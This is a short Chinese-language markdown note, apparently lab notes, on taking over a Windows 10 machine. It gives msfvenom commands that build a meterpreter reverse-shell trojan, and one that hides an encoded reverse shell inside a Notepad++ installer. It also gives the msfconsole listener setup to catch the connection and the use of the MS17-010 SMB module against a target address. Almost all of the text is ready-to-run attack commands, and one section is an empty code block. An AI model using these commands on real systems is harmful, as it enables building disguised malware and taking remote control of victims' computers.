## 使用后门程序渗透WIN10
1. 生成木马
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.44.138 LPORT=1000 -f exe -o testAttack.exe
```
或伪装木马
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.44.138 LPORT=7230 -e x86/shikata_ga_nai -x npp.8.1.9.Installer.exe -i 12 -f exe -o /root/testAttack.exe
```
2. 打开监控程序
```
msfconsole
use exploit/multi/handler
set LHOST 192.168.44.138
set LPORT 7230
exploit
```
3. win10执行木马，监控程序可实时反馈
4. 监控程序常用方法
```

```
## 使用已纰漏的漏洞渗透WIN10
```
msfconsole
search ms17_010
use auxiliary/admin/smb/ms17_010_command
show options
set rhosts 192.168.1.110
run
```